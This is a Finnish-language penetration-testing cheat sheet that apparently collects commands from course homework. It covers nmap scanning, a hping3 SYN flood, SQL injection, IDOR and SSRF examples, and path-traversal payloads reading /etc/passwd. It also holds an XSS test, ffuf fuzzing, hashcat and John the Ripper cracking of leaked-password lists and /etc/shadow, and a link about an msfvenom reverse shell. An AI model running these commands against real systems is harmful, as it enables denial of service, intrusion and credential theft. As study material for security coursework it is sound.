## Tässä Cheat Sheetissä aikaisempien kotitehtävien yhteenkoostettuja komentoja

sudo tail -F /var/log/apache2/access.log - apachen logivirta
nmap -A localhost 
grep -ir "nmap" 

verkkoliikenteen sieppaus ngrep ```sudo ngrep -d lo -i nmap```-> Ei välitä kirjaimista, -d lo kuuntelee lo interface

User-agentti vaihto : nmap -A localhost --script-args http.useragent="Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36"

sudo apt-get install rtl-433

Jos näyte urh, mutta rtl_433 käytetään -> Tiedostonimen vaihto complex16s -> cs8

```
cmp
diff -a
```
eroavaisuudet

Syn flood h1 hping3 -S --flood -p 80 10.0.0.2

## nmap


    nmap -sS -vv -T4 -A <ip-osoite> lopuksi aina se IP - osoite.
    -sS tarkoittaa TCP SIN - skannausta "Half-open-connection"
    -vv - Näkee ja tietää tasan tarkkaan, mitä skannauksessa tapahtuu ja nopeuttaa
    T4 - nopeuttaa yhä enemmän
    A OS - tunnistaminen, version tunnistaminen, skriptiskannaus ja traceroute ```
    -Pn -> Treat all host as online -- palomuurit blokkaa yleensä tietyt, joten jos tätä ei laita, skannaus saattaa skipata ne
    OUTPUT -> Tärkeä! Voit tehdä siitä tiedoston, vaikka TXT
    -p <port ranges>tietyt portit -p1-66535;skannaa kaikki portit


SQL ->

```
pstmt.setString(1, request.getParameter("acct")); ResultSet results = pstmt.executeQuery( )
https://example.com/app/accountInfo?acct=notmyacct
```

SSRF
```
file:///etc/passwd?
```

IDOR
```
https://sivu.com/customer_account?customer_number=313
Sitä muokataan -> Toinen käyttäjä
Tiedostonimen muokkaaminen -> Käyttäjät voi hakea
```

Polkuhyppely

```
filename=../../../etc/passwd
KOLME hyppyä
variaatioita monta!
....//
..../\
tiedostonimi=/var/www/images/../../../
```

Cross-site scripting https://github.com/NicoSaario/Tunkeutumistestaus/blob/main/h2%20T%C3%A4ysin%20Laillinen%20Sertifikaatti.md#cross-site-scripting-xss
```
alert()
print()
<p>Kaikki hyvin</p>
```

https://github.com/NicoSaario/Tunkeutumistestaus/blob/main/h2%20T%C3%A4ysin%20Laillinen%20Sertifikaatti.md#portswigget-academy

ffuf

```
./ffuf -w /home/nico/Downloads/common.txt -u http://127.0.0.2:8000/FUZZ
/ffuf -w /home/nico/Downloads/common.txt -u http://127.0.0.2:8000/FUZZ -fc 200 -fw 6 -fl 11 
-w sanat -c status -l linet (filtteri)
```

https://github.com/NicoSaario/Tunkeutumistestaus/blob/main/h3%20Fuzzy.md#b-fuff-me-asenna-fuffme-harjoitusmaali-karvinen-2023-fuffme---install-web-fuzzing-target-on-debian

hashcat

```
sudo apt-get -y install hashid hashcat wget
mkdir hashed
cd hashed
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar xf rockyou.txt.tar.gz
rm rockyou.txt.tar.gz
hashcat -m 0 'hash' rockyou.txt -o solved
vaihda 0 muuksi, jos hash eri, -o solved tallentaa
```

John

```
zip2john joku.zip >joku.zip.hash
john joku.zip.hash
saman voi tehdä vaikkapa pdf-tiedostoille. johnin kansioista löytyy
```

```
john --wordlist=sanalista.txt --rules=All salattu_sanakirja.hash
Äärimmäisen hidas, mutta =All tekee kaikki johnin parametrit -> isot, pienet, numerot, merkit
```

Linux /etc/shadow -> Passut -> yescrypt
```
--format=crypt
```

msfvenom

https://github.com/NicoSaario/Tunkeutumistestaus/blob/main/h4%20Levi%C3%A4m%C3%A4ss%C3%A4.md#g-tee-msfvenom-ty%C3%B6kalulla-haittaohjelma-joka-soittaa-kotiin-reverse-shell-ota-yhteys-vastaan-metasploitin-multihandler--ty%C3%B6kalulla


smbclient
```
smbclient -L
smbclient //ip/ShareName
```

ftp
```
ftp ip portti
```

Joissain tilanteissa lipun näkeminen/tuominen

```
more
get
```

curlihifistelyä
```
curl -i -d -v http://10.129.102.9
headerit, http post
```

Ncat
```
nc ip portti
```







